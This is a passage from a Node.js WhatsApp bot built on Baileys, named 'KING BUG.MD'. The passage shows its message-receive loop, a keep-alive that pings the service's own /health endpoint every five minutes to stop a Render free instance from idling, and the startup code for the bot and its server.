                console.log('🚪 WhatsApp session logged out. Auth must be paired again.');
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages || []) {
            if (!msg?.key?.id) continue;
            store.saveMessage(msg);

            // WhatsApp sometimes emits retry/stub events with no decrypted body.
            // Keep the message in the store for later retry instead of dropping it.
            if (!msg?.message) continue;

            try {
                await handleMessage(sock, msg);
            } catch (error) {
                console.error('💥 Message handler error:', error?.stack || error);
            }
        }
    });

    return sock;
}

// 🫀 KEEP-ALIVE
// Uses the service's public URL when available. The request is deliberately
// infrequent so it can keep an active Render free instance from hitting the
// idle window without creating meaningful traffic. It is not a guarantee
// against platform restarts or suspensions.
function startKeepAlive() {
    clearInterval(keepAliveTimer);

    const target =
        process.env.RENDER_EXTERNAL_URL ||
        process.env.KEEP_ALIVE_URL ||
        ''; 

    if (!target) {
        console.log('🫀 Keep-alive: no public URL configured; Baileys WebSocket keepalive remains enabled.');
        return;
    }

    const healthUrl = target.endsWith('/health')
        ? target
        : `${target.replace(/\/$/, '')}/health`;

    keepAliveTimer = setInterval(async () => {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 8000);
            const response = await fetch(`${healthUrl}?keepalive=1&t=${Date.now()}`, {
                method: 'GET',
                headers: { 'x-king-bug-keepalive': '1' },
                signal: controller.signal
            });
            clearTimeout(timeout);
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            console.log('🫀 Keep-alive heartbeat OK.');
        } catch (error) {
            console.warn('⚠️ Keep-alive heartbeat failed:', error?.message || error);
        }
    }, 5 * 60 * 1000);

    keepAliveTimer.unref?.();
    console.log(`🫀 Keep-alive enabled → ${healthUrl}`);
}

// 🚀 LAUNCH
startBot()
    .then(() => console.log('💀🔥 KING BUG.MD — FULLY ARMED AND ONLINE (3.10.3 / LID-PN + SEND RETRY + BUTTON + MEDIA FIX)'))
    .catch(err => console.error('💥 BOT FAILED:', err));

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Server running on port ${PORT}`);
    startKeepAlive();
});

